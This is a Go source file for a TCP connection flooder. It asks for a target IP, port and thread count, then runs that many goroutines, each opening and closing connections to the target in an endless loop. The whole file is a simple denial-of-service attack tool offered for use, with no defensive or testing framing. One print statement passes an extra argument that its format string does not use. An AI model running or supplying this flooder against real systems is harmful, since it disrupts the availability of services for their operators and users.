package main
import (
	"fmt"
	"net"
	"sync"
	"time"
)

func flood(ip string , port int , wg *sync.WaitGroup){
	defer wg.Done()
	address := fmt.Sprintf("%s:%d", ip , port)
	for {
		conn,err := net.DialTimeout("tcp", address, 2*time.Second)
		if err != nil {
			fmt.Printf("[-] Failed to connect %s:%d\n", ip, port, err)
			return
		}

		fmt.Printf("[++] Sent TCP request to %s\n", address)
		conn.Close()
	}
}

func main(){
	var ip string
	var port , threads int

	fmt.Print("Enter Target IP: ")
	fmt.Scanln(&ip)

	fmt.Print("Enter Target Port: ")
	fmt.Scanln(&port)

	fmt.Print("Enter Number of Threads: ")
	fmt.Scanln(&threads)

	var wg sync.WaitGroup

	for i:= 0; i< threads; i++{
		wg.Add(1)
		go flood(ip ,port, &wg)
	}
	wg.Wait()
}


